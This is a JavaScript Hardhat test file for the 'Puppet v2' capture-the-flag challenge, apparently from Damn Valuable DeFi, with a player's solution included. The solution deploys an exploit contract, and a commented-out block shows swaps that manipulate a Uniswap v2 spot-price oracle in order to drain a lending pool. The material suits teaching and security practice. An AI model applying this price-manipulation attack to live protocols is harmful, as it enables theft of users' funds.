const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

describe('[Challenge] Puppet v2', function () {
    let deployer, player;
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer);
        const UniswapRouterFactory = new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer);
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    
        // Deploy tokens to be traded
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(ethers.constants.AddressZero);
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        );        

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(
            uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        uniswapExchange = await UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        );
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0);
            
        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetV2Pool', deployer)).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        );

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Check pool's been correctly setup
        expect(
            await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)
        ).to.eq(3n * 10n ** 17n);
        expect(
            await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.eq(300000n * 10n ** 18n);
    });

    it('Execution', async function () {

        // The idea of the code was to use an oracle, but v2 doesn't keep a history of the accumulators unlike v3
        // Therefore the oracle still uses spot prices
        // A difference with v1 is that the price is determined to be the one before the first interaction in a block

        decimal = 1n * 10n ** 18n;;
        playerToken = await token.connect(player);
        playerWeth = await weth.connect(player);
        playerRouter = await uniswapRouter.connect(player);
        playerPool = await lendingPool.connect(player);

        deadline = (await ethers.provider.getBlock('latest')).timestamp + 150;

        Exploit = await (await ethers.getContractFactory('ExploitPuppetV2', player)).deploy(token.address, weth.address, lendingPool.address, uniswapRouter.address);
        await playerToken.approve(Exploit.address, ethers.constants.MaxUint256);
        await playerWeth.approve(Exploit.address, ethers.constants.MaxUint256);
        await Exploit.exploit(deadline, {value: PLAYER_INITIAL_ETH_BALANCE * BigInt(99) / BigInt(100)});

        // Initially writing it in JS was a mistake, don't do it...
/*
        // We now have enough to take over the pool
        // Need to get some WETH with our eth balance, but further swaps will changethe amount of neededWeth
        finalAmounts = await playerRouter.getAmountsOut(BigInt(playerBalance) * BigInt(99) / BigInt(100), [weth.address, token.address])
        await playerRouter.swapExactETHForTokens(0, [weth.address, token.address], player.address, deadline,
            {value: BigInt(playerBalance) * BigInt(99) / BigInt(100),  gasLimit: 1e6});

        
        playerTokBalance = await token.balanceOf(player.address);
        ethToWETHBalance = BigInt(playerBalance) / BigInt(100) * BigInt(99);
        await playerRouter.swapTokensForExactTokens(ethToWETHBalance, playerTokBalance, [token.address, weth.address], player.address, deadline, {gasLimit: 1e6});

        // Empty pool
        await playerWeth.approve(lendingPool.address, ethers.constants.MaxUint256);

        console.log(await weth.balanceOf(player.address));
        console.log(await token.balanceOf(player.address));
        console.log(neededWeth);
        console.log(await lendingPool.calculateDepositOfWETHRequired(poolBalance))
        await playerPool.borrow(poolBalance);*/
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool        
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
    });
});